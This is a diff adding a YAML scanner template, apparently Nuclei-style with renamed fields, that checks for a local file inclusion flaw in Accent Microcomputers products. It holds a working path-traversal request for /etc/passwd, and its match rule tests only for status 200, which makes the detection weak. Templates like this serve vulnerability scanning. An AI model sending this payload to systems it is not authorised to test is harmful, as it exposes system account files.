@@ -1,0 +1,20 @@
+id: accent-microcomputers-lfi
+brief:
+    title: Accent Microcomputers LFI
+    by: 0x_Akoko
+    level: high
+    about: A local file inclusion vulnerability in Accent Microcomputers offerings could allow remote attackers to retrieve password files.
+    label:
+        - microcomputers
+        - accent
+        - lfi
+        - vuln
+    score: CVSS:8.6
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/index.php?id=50&file=../../../../../../../../../etc/passwd'
+      signs:
+        - "on": status
+          status:
+            - 200
